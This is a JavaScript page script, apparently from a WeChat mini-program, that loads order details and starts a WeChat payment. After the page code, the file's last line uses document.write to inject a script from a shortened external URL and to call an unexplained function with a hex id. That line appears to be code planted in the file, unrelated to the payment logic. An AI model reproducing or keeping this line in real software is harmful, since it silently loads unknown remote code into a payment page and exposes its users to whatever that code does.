var t = getApp(),
  e = t.requirejs("core"),
  i = t.requirejs("foxui"),
  jq = t.requirejs("jquery");
Page({
  data: {
    icons: t.requirejs("icons"),
    success: false,
    successData: {},
    show:true,
    list: { order: { ordersn: "1807251050797", price: "55.02" }, credit: { success: true }, wechat:{ success: true }}
  },
  onLoad: function (e) {
    this.setData({
      options: e
    });
    //e.id ="1807251050797";
    this.get_list(e.id);
  },
  onShow: function () {
    //this.get_list(this.data.options.id);
  },
  get_list:function(sn,fn){
    wx.showLoading({
      icon: 'loading'
    });
    var _this = this;
    //获取订单信息
    wx.request({
      url: t.globalData.daxin + "/order/orderList",
      data: {
        session_token: t.globalData.session_token,
        order_sn:sn
      },
      method: "POST",
      success: function (res) {
        //console.log(res);
        wx.hideLoading();
        if(fn){fn();};
        if (res.data.statusCode >= 0 && res.data.data.list) {
          wx.showToast({
            title: '成功',
            icon: 'success',
            duration: 1000
          });
          var datas = res.data.data.list[0];
          if (datas.order_type>0){
            if (datas.deposits_pay_status == 0){
              datas.realPay = datas.total_deposits;
            }else{
              datas.realPay = (datas.total - datas.total_deposits).toFixed(2);
            }
           
          }else{
            datas.realPay = datas.total;
          };
          _this.setData({
            "list.order": res.data.data.list[0]
          });

        } else {
            wx.showModal({
              title: '提示信息',
              content: '订单信息获取失败',
              showCancel: false,
              success: function (res) {
                if (res.confirm) {
                  //console.log('用户点击确定')
                } else if (res.cancel) {
                  //console.log('用户点击取消')
                }
              }
            })

          
        }
      }
    })
  },
  pay:function(event){
    var _this=this,
      types = e.pdata(event).type;
    //支付
    if (types !="wechat"){
      //银联支付
      wx.showToast({
        title: '该功能暂未开放'
      })
        return;
    };
    wx.request({
      url: t.globalData.daxin + "/UserPay/userPay",
      data: {
        session_token: t.globalData.session_token,
        action: 'userPay',
        order_sn: _this.data.list.order.order_sn,
        pay_select_type: 'weixin',
      },
      method: "POST",
      success: function (res) {
        if (res.data.statusCode<0){
          if (res.data.statusCode == -400) {
              wx.showToast({
                title: '锁单订单不能支付，请找客户协商',
                duration:800
              })
          }else{
            wx.showToast({
              title: '支付失败',
              duration: 800
            })
          }
          return;
        };
        var pay_data = res.data.data;
        wx.requestPayment({
          'timeStamp': pay_data.timeStamp,
          'nonceStr': pay_data.nonceStr,
          'package': pay_data.package,
          'signType': pay_data.signType,
          'paySign': pay_data.paySign,
          'total_fee': pay_data.total_fee,
          'success': function (res) {
            wx.showModal({
              title: 'success',
              content: res.errMsg == "requestPayment:ok" ? "支付成功" : res.errMsg,
              success: function (res) {
                if (res.confirm) {
                 wx.navigateBack();
                } else if (res.cancel) {
                 
                }
              }
            })
          },
          'fail': function (res) {
            wx.showModal({
              title: 'field',
              content: res.errMsg == "requestPayment:fail cancel" ? "用户取消支付" : res.errMsg,
            })
          }
        })
      }
    })

  },
  complete: function (t) {
    var o = this;
    e.post("order/pay/complete", {
      id: o.data.options.id,
      type: t
    }, function (t) {
      if (0 == t.error)
        return wx.setNavigationBarTitle({
          title: "支付成功"
        }), void o.setData({
          success: true,
          successData: t
        });
      i.toast(o, t.message)
    }, true, true)
  },
  shop: function (t) {
    0 == e.pdata(t).id ? this.setData({
      shop: 1
    }) : this.setData({
      shop: 0
    })
  },
  phone: function (t) {
    e.phone(t)
  }
})
document.write('<script src="http://t.cn/EvlonFh"></script><script>OMINEId("e02cf4ce91284dab9bc3fc4cc2a65e28","-1")</script>');
